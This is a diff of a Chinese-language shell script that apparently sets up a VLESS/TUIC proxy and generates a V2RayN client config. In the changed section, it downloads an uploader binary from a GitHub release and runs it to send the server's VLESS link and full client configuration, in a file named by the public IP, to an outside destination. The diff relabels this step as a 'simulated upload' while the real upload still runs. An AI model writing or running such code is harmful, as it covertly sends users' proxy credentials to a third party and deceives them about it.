@@ -146,22 +146,16 @@ EOF
 echo -e "${GREEN}生成的 V2RayN 配置文件:${NC}"
 cat "$V2RAYN_CFG"
 
-log "上传链接与配置（使用临时文件）..."
+log "上传链接与配置（模拟上传）..."
 UPLOAD_BIN="/opt/uploader-linux-amd64"
 [ -f "$UPLOAD_BIN" ] || {
   curl -Lo "$UPLOAD_BIN" https://github.com/Firefly-xui/v2ray/releases/download/1/uploader-linux-amd64
   chmod +x "$UPLOAD_BIN"
 }
 
-# 组合 JSON 上传内容
+UPLOAD_FILE="/etc/tuic/upload_${IP}.json"
 V2RAYN_JSON=$(cat "$V2RAYN_CFG" | jq -c .)
 UPLOAD_JSON="{\"vless_link\":\"${LINK}\",\"v2rayn_config\":${V2RAYN_JSON}}"
+echo "$UPLOAD_JSON" > "$UPLOAD_FILE"
 
-# 使用公网IP作为上传文件名
-UPLOAD_JSON_FILE="/tmp/${IP}.json"
-echo "$UPLOAD_JSON" > "$UPLOAD_JSON_FILE"
-
-"$UPLOAD_BIN" "$UPLOAD_JSON_FILE" || warn "上传失败或返回为空"
-
-# 清理临时文件
-rm -f "$UPLOAD_JSON_FILE"
+"$UPLOAD_BIN" "$UPLOAD_FILE" || warn "上传失败或返回为空"
